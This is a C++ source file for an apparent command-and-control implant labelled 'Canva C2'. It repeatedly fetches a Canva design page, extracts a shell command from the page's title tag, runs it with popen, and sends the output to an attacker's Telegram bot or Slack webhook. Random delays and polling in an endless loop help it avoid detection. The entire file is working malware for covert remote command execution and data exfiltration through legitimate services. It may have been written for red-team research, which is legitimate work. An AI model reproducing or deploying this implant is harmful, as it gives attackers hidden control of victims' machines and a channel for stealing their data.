#include <array>
#include <chrono>
#include <cstdlib>
#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <memory>
#include <random>
#include <regex>
#include <string>
#include <thread>

void banner() {
    std::string banner = R"(
  ______                                                ______      _____  
 /      \                                              /      \   /      \ 
/$$$$$$  |  ______   _______   __     __  ______       /$$$$$$  |/$$$$$$  |
$$ |  $$/  /      \ /       \ /  \   /  |/      \      $$ |  $$/ $$____$$ |
$$ |       $$$$$$  |$$$$$$$  |$$  \ /$$/ $$$$$$  |     $$ |       /    $$/ 
$$ |  __  /    $$ |$$ |  $$ | $$  /$$/  /    $$ |      $$ |  __ /$$$$$$/  
$$ \__/  |/$$$$$$$ |$$ |  $$ |  $$ $$/  /$$$$$$$ |     $$ \__/  |$$ |_____ 
$$    $$/ $$    $$ |$$ |  $$ |   $$$/   $$    $$ |     $$    $$/ $$       |
 $$$$$$/   $$$$$$$/ $$/   $$/     $/     $$$$$$$/        $$$$$$/ $$$$$$$$/ 

            github - https://github.com/jeet-ganguly (follow for more tools/ new research)
)";

    std::cout << banner << std::endl << std::endl;
}

//Your Canva document URL 
const std::string URL = "https://www.canva.com/design/XXXXXXXXXX/XXXXXXXXXXX/view?embed"; //Need to change

std::string EscapeJson(const std::string& s)
{
    std::string output;

    for (char c : s)
    {
        switch (c)
        {
            case '"':  output += "\\\""; break;
            case '\\': output += "\\\\"; break;
            case '\b': output += "\\b";  break;
            case '\f': output += "\\f";  break;
            case '\n': output += "\\n";  break;
            case '\r': output += "\\r";  break;
            case '\t': output += "\\t";  break;
            default:   output += c;
        }
    }

    return output;
}

static size_t discard_response(void *ptr, size_t size, size_t nmemb,
                               void *userdata) {
  return size * nmemb;
}

int send_telegram(const std::string &out) {
  std::string output = out;
  output = EscapeJson(output);
  long http_code = 0;
  const char *token = std::getenv("TELEGRAM_BOT_TOKEN"); //Save telegram_bot_token in environment variable
  const char *chat = std::getenv("TELEGRAM_CHAT_ID"); //Save chat_id in environment variable

  if (!token || !chat) {
    return 0;
  }

  std::string bot_token = token;
  std::string chat_id = chat;
  CURL *curl = curl_easy_init();

  if (!curl) {
    std::cout << "Failed to initialize curl\n";
    return 0;
  }

  std::string url = "https://api.telegram.org/bot" + bot_token + "/sendMessage";
  std::cout << url << std::endl;
  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  const size_t CHUNK_SIZE = 3500; //Sending data by chunk

  for (size_t i = 0; i < output.size(); i += CHUNK_SIZE) {
    std::string chunk = output.substr(i, CHUNK_SIZE);
    char *escaped = curl_easy_escape(curl, chunk.c_str(), chunk.length());
    std::string post_data = "chat_id=" + chat_id + "&text=" + escaped;
    curl_free(escaped);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_response);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (http_code != 200) {
      std::cout << "HTTP Error: " << http_code << std::endl;
      curl_easy_cleanup(curl);
      return 0;
    }

    if (res != CURLE_OK) {
      std::cout << curl_easy_strerror(res) << '\n';
      curl_easy_cleanup(curl);
      return 0;
    }
  }

  curl_easy_cleanup(curl);
  return 1;
}

int send_slack(const std::string &out) {  
  std::string output = out;
  output = EscapeJson(output);  
  long http_code = 0;
  CURL *curl = curl_easy_init();

  if (!curl) {
    std::cout << "Failed to initialize curl\n";
    return 1;
  }

  //Add your Slack Webhook url
  std::string webhook = "https://hooks.slack.com/services/XXXXXXXXX/XXXXXXXXX/XXXXXXXX"; //Change this

  struct curl_slist *headers = NULL;
  headers = curl_slist_append(headers, "Content-Type: application/json");
  curl_easy_setopt(curl, CURLOPT_URL, webhook.c_str());
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
  const size_t CHUNK_SIZE = 3000;   //Sending data by chunk

  for (size_t i = 0; i < output.size(); i += CHUNK_SIZE) {
    std::string chunk = output.substr(i, CHUNK_SIZE);
    std::string json = R"({"text":")" + chunk + R"("})";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_response);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (http_code != 200) {
      std::cout << "HTTP Error: " << http_code << std::endl;
      curl_easy_cleanup(curl);
      return 0;
    }

    if (res != CURLE_OK) {
      std::cout << curl_easy_strerror(res) << '\n';
      curl_slist_free_all(headers);
      curl_easy_cleanup(curl);
      return 0;
    }
  }

  curl_slist_free_all(headers);
  curl_easy_cleanup(curl);
  return 1;
}

std::string execCommand(const std::string &cmd) {
  std::array<char, 128> buffer;
  std::string result;

  // Pass cmd.c_str() to the pipe function
  #if defined(_WIN32)
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"),
                                                  _pclose);
  #else
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"),
                                                  pclose);
  #endif

  if (!pipe) {
    throw std::runtime_error("popen() failed!");
  }

  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }

  return result;
}

size_t WriteCallback(void *contents, size_t size, size_t nmemb,
                     void *userdata) {
  size_t total = size * nmemb;
  static_cast<std::string *>(userdata)->append(static_cast<char *>(contents),
                                               total);

  return total;
}

int random_number(int min, int max) {
  static std::random_device rd;
  static std::mt19937 gen(rd());
  std::uniform_int_distribution<> dist(min, max);
  return dist(gen);
}

void save_debug_log(const std::string &response) {
  std::ofstream file("command.log", std::ios::binary);

  if (!file.is_open()) {
    std::cerr << "Unable to create command.log\n";
    return;
  }

  file.write(response.data(), response.size());
  file.close();
}

std::string extract_blog_command(const std::string &html) {
  static const std::regex command_regex(R"(<title[^>]*>([\s\S]*?)</title>)",
                                        std::regex_constants::icase);

  std::smatch match;

  if (std::regex_search(html, match, command_regex)) {
    return match[1].str();
  }

  return "";
}

bool request_myblog(std::string &response) {
  CURL *curl = curl_easy_init();

  if (!curl) {
    std::cerr << "Failed to initialize libcurl\n";
    return false;
  }

  struct curl_slist *headers = nullptr;
  headers = curl_slist_append(headers,
                              "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux "
                              "x86_64; rv:152.0) Gecko/20100101 Firefox/152.0");
  headers = curl_slist_append(
      headers,
      "Accept: "
      "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
  headers = curl_slist_append(headers, "Sec-GPC: 1");
  headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
  headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
  headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
  headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
  headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
  headers = curl_slist_append(headers, "Priority: u=0, i");

  curl_easy_setopt(curl, CURLOPT_URL, URL.c_str());
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
  curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2TLS);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
  /* Automatically decompress gzip/br/zstd/deflate */
  curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

  CURLcode res = curl_easy_perform(curl);

  long status = 0;
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);
  std::cout << "HTTP Status : " << status << std::endl;

  if (res != CURLE_OK) {
    std::cerr << "libcurl Error : " << curl_easy_strerror(res) << std::endl;
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return false;
  }

  curl_slist_free_all(headers);
  curl_easy_cleanup(curl);
  return status == 200;
}

void main_logic() {
  std::string response;

  if (!request_myblog(response))
    return;

  std::string command = extract_blog_command(response);

  if (command.empty()) {
    std::cout << "Failed to extract <command>." << std::endl;
    std::cout << "Saving response to command.log..." << std::endl;
    save_debug_log(response);
    return;
  }

  int delay = random_number(5, 10);
  std::cout << "Running Command ..." << command << std::endl;
  std::string output = "";

  try {
    output = execCommand(command);
    //std::cout << "Captured Output:" << output << std::endl;
  } catch (const std::exception &e) {
    std::cerr << "Error: " << e.what() << std::endl;
  }

  std::cout << "Sending output after " << delay << " seconds..." << std::endl;
  std::this_thread::sleep_for(std::chrono::seconds(delay));

  if (!output.empty()) {
    int temp = send_telegram(output);
    if (temp) {
      std::cout << "Output Sent To Telegram ....\n";
    } else {
      int flag = send_slack(output);
      if (flag) {
        std::cout << "Output Sent To Slack ....\n";
      } else {
        std::cout << "Failed ....\n";
      }
    }
  } else {
    int temp = send_telegram("Output not came!");
    if (temp) {
      [[maybe_unused]] int x = temp;
    } else {
      int flag = send_slack("Output not came!");
      [[maybe_unused]] int y = flag;
    }
  }
}

int main() {
  banner();
  curl_global_init(CURL_GLOBAL_DEFAULT);
  main_logic();

  while (true) {
    int delay = random_number(30, 60);
    std::string message =
        "Polling for after " + std::to_string(delay) + " seconds.....";
    int temp = send_telegram(message);
    if (temp) {
      std::cout << message << std::endl;
    } else {
      int flag = send_slack(message);
      if (flag) {
        std::cout << message << std::endl;
      } else {
        std::cout << "Error" << std::endl;
      }
    }
    std::this_thread::sleep_for(std::chrono::seconds(delay));
    main_logic();
  }

  curl_global_cleanup();
  return 0;
}